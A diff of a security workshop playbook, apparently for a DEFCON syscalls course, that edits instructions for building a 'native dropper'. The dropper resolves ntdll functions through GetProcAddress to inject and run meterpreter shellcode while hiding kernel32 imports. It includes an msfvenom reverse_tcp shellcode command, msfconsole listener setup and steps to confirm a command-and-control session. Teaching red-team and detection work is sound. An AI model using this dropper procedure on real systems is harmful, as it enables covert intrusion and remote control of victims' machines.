@@ -1,12 +1,12 @@
 ## Exercise 3: Native Dropper
-In this exercise we will make the first modification to the Win32 dropper, replacing the Windows APIs (kernel32.dll) with **native APIs** also called **native functions** (ntdll.dll). We will create a dropper based on native APIs and call it **native-dropper**.
+In this exercise we will make the first modification to the Win32 dropper, replacing the Windows APIs (kernel32.dll) with **native APIs** also called **native functions** (ntdll.dll). We will create a dropper based on native APIs and call it **native dropper**.
 ![medium_level_dropper_principal](https://user-images.githubusercontent.com/50073731/235372969-4d24ddec-7ee5-443e-966a-24b3d70dc3a8.png)
 
 
 ## Exercice 3 tasks:
-1. Download the native dropper POC from the Code section of this chapter.
-2. The code in the POC is partially complete. Following the instructions in this playbook, you need to finish the part where the four native functions are loaded from ntdll.dll by using ``GetProcAddress``
-3. Then create x64 meterpreter shellcode, copy it into the POC and compile it.  
+1. Download the native dropper poc from the Code section of this chapter.
+2. The code in the poc is partially complete. Following the instructions in this playbook, you need to finish the part where the four native functions are loaded from ntdll.dll by using ``GetProcAddress``
+3. Then create x64 meterpreter shellcode, copy it into the poc and compile it.  
 4. Create and run a staged x64 meterpreter listener using msfconsole.
 5. Run your compiled .exe and check that a stable command and control channel opens. 
 6. Use the Visual Studio **dumpbin** tool to analyse the native dropper. Are any Win32 APIs being imported from kernel32.dll? Is the result what you expected?  
@@ -16,7 +16,7 @@ In this exercise we will make the first modification to the Win32 dropper, repla
 
 
 ## Visual Studio
-You can download the POC from the code section of this chapter. In this POC, we replace the four Win32 APIs from the Win32 dropper with the corresponding native function or API.
+You can download the poc from the code section of this chapter. In this poc, the four Win32 APIs from the Win32 dropper are replaced with the corresponding native functions.
 - Memory allocation, ``VirtualAlloc`` is replaced by **``NtAllocateVirtualMemory``**.
 - Write shellcode to memory, ``WriteProcessMemory`` is replaced by **``NtWriteVirtualMemory``**.
 - Shellcode execution, ``CreateThread`` is replaced by **``NtCreateThreadEx``**.
@@ -24,7 +24,7 @@ You can download the POC from the code section of this chapter. In this POC, we 
 
 A few words about the functionality of the native dropper code. Unlike the Windows APIs, most native APIs are not officially or partially documented by Microsoft and are therefore not intended for Windows OS developers. In the case of the Win32 dropper from the previous chapter, we don't need to worry about manually implementing function structures, or how to handle transitions from Win32 APIs to native APIs, etc. This is because the Windows headers like ``Windows.h`` have already implemented all the functionality and provide us with the functionality by using the Win32 APIs. If we use the native APIs directly, without the help of the Win32 APIs, it is a bit more complicated and additional code has to be used in the native dropper. The reason for this is that the Windows headers or libraries do not support the direct use of native functions, so we have to implement the required code manually. Which means to be able to use native funtions in the native dropper we have to get the memory address of each native function from ntdll.dll at runtime. 
 
-First we need to define the function pointers for all the native functions we need. For example, ``typedef NTSTATUS(WINAPI* PNTALLOCATEVIRTUALMEMORY)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);`` creates a new type ``PNTALLOCATEVIRTUALMEMORY`` which is a function pointer of type ``NTSTATUS``. In general, a function pointer is a type of pointer that points to a function instead of a data value or an array. It holds the memory address of a function, and using this pointer, we can call the function. This part is already fully implemented in the Native Dropper POC.
+First we need to define the function pointers for all the native functions we need. For example, ``typedef NTSTATUS(WINAPI* PNTALLOCATEVIRTUALMEMORY)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);`` creates a new type ``PNTALLOCATEVIRTUALMEMORY`` which is a function pointer of type ``NTSTATUS``. In general, a function pointer is a type of pointer that points to a function instead of a data value or an array. It holds the memory address of a function, and using this pointer, we can call the function. This part is already fully implemented in the native dropper poc.
 <details>
     
  ```
@@ -37,7 +37,7 @@ typedef NTSTATUS(NTAPI* PNTWAITFORSINGLEOBJECT)(HANDLE, BOOLEAN, PLARGE_INTEGER)
  ```
 </details>
  
-The second step is to get the memory address of each native function from ntdll.dll at runtime. So we use ``GetModuleHandleA`` to open a handle to ntdll.dll in memory. Then we pass the handle and the name e.g. ``NtAllocateVirtualMemory`` to ``GetProcAddress`` to get a pointer to the native function e.g. ``NtAllocateVirtualMemory`` in ntdll.dll. Next we cast this function pointer to the type ``PNTALLOCATEVIRTUALMEMORY`` and assign or store the resulting function pointer to the corresponding variable, e.g. ``NtAllocateVirtualMemory``. In simple words, ``NtAllocateVirtualMemory`` is declared as a function pointer of type ``PNTALLOCATEVIRTUALMEMORY`` and it holds the memory address of the ``NtAllocateVirtualMemory`` function as it is loaded into the current process from ntdll.dll. So when we call NtAllocateVirtualMemory in the native dropper code, we are actually calling the function from ntdll.dll at the memory address stored in the NtAllocateVirtualMemory function pointer. This **code part is not finished** and **must be completed by the workshop attendee**. In the native dropper POC you will see, that the code for the native function ``NtAllocateVirtualMemory`` is already written and based on that schema you have to complete it for the other three native functions ``NtWriteVirtualMemory``, ``NtCreateThreadEx`` and ``NtWaitForSingleObject``.
+The second step is to get the memory address of each native function from ntdll.dll at runtime. So we use ``GetModuleHandleA`` to open a handle to ntdll.dll in memory. Then we pass the handle and the name e.g. ``NtAllocateVirtualMemory`` to ``GetProcAddress`` to get a pointer to the native function e.g. ``NtAllocateVirtualMemory`` in ntdll.dll. Next we cast this function pointer to the type ``PNTALLOCATEVIRTUALMEMORY`` and assign or store the resulting function pointer to the corresponding variable, e.g. ``NtAllocateVirtualMemory``. In simple words, ``NtAllocateVirtualMemory`` is declared as a function pointer of type ``PNTALLOCATEVIRTUALMEMORY`` and it holds the memory address of the ``NtAllocateVirtualMemory`` function as it is loaded into the current process from ntdll.dll. So when we call NtAllocateVirtualMemory in the native dropper code, we are actually calling the function from ntdll.dll at the memory address stored in the NtAllocateVirtualMemory function pointer. This **code part is not finished** and **must be completed by the workshop attendee**. In the native dropper poc you will see, that the code for the native function ``NtAllocateVirtualMemory`` is already written and based on that schema you have to complete it for the other three native functions ``NtWriteVirtualMemory``, ``NtCreateThreadEx`` and ``NtWaitForSingleObject``.
 <details>
     
 ```
@@ -50,7 +50,7 @@ The second step is to get the memory address of each native function from ntdll.
 
 <details>
     <summary>Solution</summary>
-If it was at this time not possible for you to complete the code for the three missing native functions, you can use the following code and copy it into the Native Dropper POC. 
+If it was at this time not possible for you to complete the code for the three missing native functions, you can use the following code and copy it into the native dropper poc. 
 
 ```
 // Here we load the native API functions from ntdll.dll using GetProcAddress, which retrieves the address of an exported function
@@ -63,7 +63,7 @@ If it was at this time not possible for you to complete the code for the three m
 
 </details>
     
-Shellcode declaration same as before in the Win32 Dropper.
+Shellcode declaration same as before in the Win32 dropper.
 <details>
 
 ```
@@ -74,7 +74,7 @@ Shellcode declaration same as before in the Win32 Dropper.
 
     
      
-Here is the **complete code**, but you can also find it already implemented in the code POC of this chapter.
+Here is the **complete code**, but you can also find it already implemented in the code poc of this chapter.
 <details>
     
 ```
@@ -141,14 +141,14 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IPv4_Redirector_or_IPv4_Ka
 <img width="696" alt="image" src="https://user-images.githubusercontent.com/50073731/235358025-7267f8c6-918e-44e9-b767-90dbd9afd8da.png">
 </p>
 
-The shellcode can then be copied into the Medium-Level-Dropper poc by replacing the placeholder at the unsigned char, and the poc can be compiled as an x64 release.<p align="center">
+The shellcode can then be copied into the native dropper poc by replacing the placeholder at the unsigned char, and the poc can be compiled as an x64 release.<p align="center">
 <img width="479" alt="image" src="https://user-images.githubusercontent.com/50073731/235414557-d236582b-5bab-4754-bd12-5f7817660c3a.png">
 </p>
 </details>    
 
 
 ## MSF-Listener
-Before we test the functionality of our Medium-Level-Dropper, we need to create a listener within msfconsole.
+Before we test the functionality of our native dropper, we need to create a listener within msfconsole.
 <details>
     
 **kali>**
@@ -170,7 +170,7 @@ run
 </details>
  
     
-Once the listener has been successfully started, you can run your compiled Medium-Level-Dropper.exe. If all goes well, you should see an incoming command and control session. 
+Once the listener has been successfully started, you can run your compiled native dropper. If all goes well, you should see an incoming command and control session. 
 <details>
     
 <p align="center">
@@ -179,7 +179,7 @@ Once the listener has been successfully started, you can run your compiled Mediu
 </details>
 
 
-## Native Dropper analysis: dumpbin 
+## Native Dropper Analysis: Dumpbin 
 The Visual Studio tool dumpbin can be used to check which Windows APIs are imported via kernel32.dll. The following command can be used to check the imports. Which results do you expect?
 <details>    
     
@@ -192,7 +192,7 @@ dumpbin /imports medium_level.exe
 
 <details>
     <summary>Solution</summary>    
-Compared to the High-Level-Dropper, you can see that the medium-level dropper **no longer imports** the Windows APIs VirtualAlloc, WriteProcessMemory, CreateThread, and WaitForSingleObject from kernel32.dll. This was expected and is correct.
+Compared to the Win32 dropper, you can see that the native dropper **no longer imports** the Windows APIs VirtualAlloc, WriteProcessMemory, CreateThread, and WaitForSingleObject from kernel32.dll. This was expected and is correct.
 <p align="center">
 <img width="729" alt="image" src="https://user-images.githubusercontent.com/50073731/235374656-117e0468-cd4d-4832-afb7-599cf94d2f1b.png">
 </p>
@@ -200,7 +200,7 @@ Compared to the High-Level-Dropper, you can see that the medium-level dropper **
 
      
      
-## Native Dropper analysis: x64dbg
+## Native Dropper Analysis: x64dbg
 The first step is to run your native dropper, check that the .exe is running and that a stable meterpreter C2 channel is open. 
 Then we open x64dbg and attach to the running process, note that if you open the native dropper directly in x64dbg you need to run the assembly first.
      
@@ -216,11 +216,11 @@ Then we open x64dbg and attach to the running process, note that if you open the
 
 
 First we want to check which APIs (Win32 or Native) or if the correct APIs are being imported and from which module or memory location. 
-Remember that no direct syscalls are used in the Native dropper. What results do you expect?
+Remember that no direct syscalls are used in the native dropper. What results do you expect?
      
 <details>
     <summary>Solution</summary>
-Checking the imported symbols in our Native dropper, we should see that the Win32 APIs VirtualAlloc, WriteProcessMemory, CreateThread and WaitForSingleObject are no longer imported from kernel32.dll. So the result is the same as with dumpbin and seems to be valid.     
+Checking the imported symbols in our native dropper, we should see that the Win32 APIs VirtualAlloc, WriteProcessMemory, CreateThread and WaitForSingleObject are no longer imported from kernel32.dll. So the result is the same as with dumpbin and seems to be valid.     
 <p align="center">
 <img width="900" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/95b9a92e-305c-4345-b40d-3241a7092161"> 
 </p>  
@@ -247,7 +247,7 @@ We also want to check, for example, for NtAllocateVirtualMemory, from which modu
 </p>            
 </details>     
 
-## Summary: Native-Dropper
+## Summary: Native Dropper
 - We made the transition from high-level APIs to medium-level APIs, or from Windows APIs to native APIs.
 - But still no direct use of system calls
 - Syscall execution via native_dropper.exe -> ntdll.dll -> syscall
